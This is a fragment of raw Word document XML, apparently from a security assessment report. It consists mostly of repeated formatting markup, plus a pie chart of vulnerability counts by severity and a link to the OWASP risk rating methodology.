                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1971008767">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="20090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947">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="898630476">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="1979063620">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1984775004">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1984851330">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1988241186">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1991396147">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1991708906">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1992519724">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1995982919">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2004163721">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2006668607">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2011251316">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2012053184">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2013869867">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2030373614">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2032493759">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2039810425">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2040084928">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1811169144">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="618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9230">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2047824860">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2052226923">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2061896559">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2064988239">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1817651062">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1991784362">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="2070303837">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2077127429">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2081637926">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2081905163">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2088652458">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2094081023">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2097090935">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2101487873">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2118016581">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2120290907">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2120484801">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2125299352">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2128810123">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2131048733">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2131196951">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2137986104">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2139715428">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="21454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2.xml" /><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer5.xml"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footer" Target="footer7.xml" /><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/endnotes" Target="endnotes.xml" /><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer2.xml" /><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header4.xml"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4.xml" /><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer6.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24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology" TargetMode="External" /><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml" /><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer3.xml" /><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer9.xml" /><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer1.xml" /><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/chart" Target="charts/chart1.xml" /><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml" /><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.png" /><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header3.xml" /><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer8.xml" /><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/word/media/image3.jpeg" /><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/word/media/image4.jpeg"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Z:\Quy%20dinh%20ve%20ho%20so\Qui%20dinh%20ve%20hs%20thiet%20ke\Template%20ho%20so%20giai%20phap.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2"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" i="0" baseline="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>VULNERABILITIES STATISTICS CHART </a:t>
            </a:r>
            <a:endParaRPr lang="x-none" sz="1200">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
              <a:effectLst/>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manualLayout>
          <c:layoutTarget val="inner"/>
          <c:xMode val="edge"/>
          <c:yMode val="edge"/>
          <c:x val="7.0391513560804905E-2"/>
          <c:y val="0.14321428571428574"/>
          <c:w val="0.92960848643919514"/>
          <c:h val="0.7183923884514436"/>
        </c:manualLayout>
      </c:layout>
      <c:pieChart>
        <c:varyColors val="1"/>
        <c:ser>
          <c:idx val="0"/>
          <c:order val="0"/>
          <c:tx>
            <c:strRef>
              <c:f>Sheet1!$B$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>VULNERABILITIES STATISTICS CHART </c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="FFC0CB"/>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Critical</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>High</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>Medium</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>Low</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$B$2:$B$5</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="4"/>
                <c:pt idx="0">
                  <c:v>2</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>1</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>2</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>0</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000000-8459-494B-AD3E-271B6A16D9E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0394E-F9D0-4CCF-9A5C-D1357376E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ho so giai phap.dot</Template>
  <TotalTime>14</TotalTime>
  <Pages>13</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HPT VIETNAM</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>14347</CharactersWithSpaces>
  <SharedDoc>false</SharedDoc>
  <HLinks>
    <vt:vector size="138" baseType="variant">
      <vt:variant>
        <vt:i4>1245234</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>137</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454269</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1245234</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>131</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
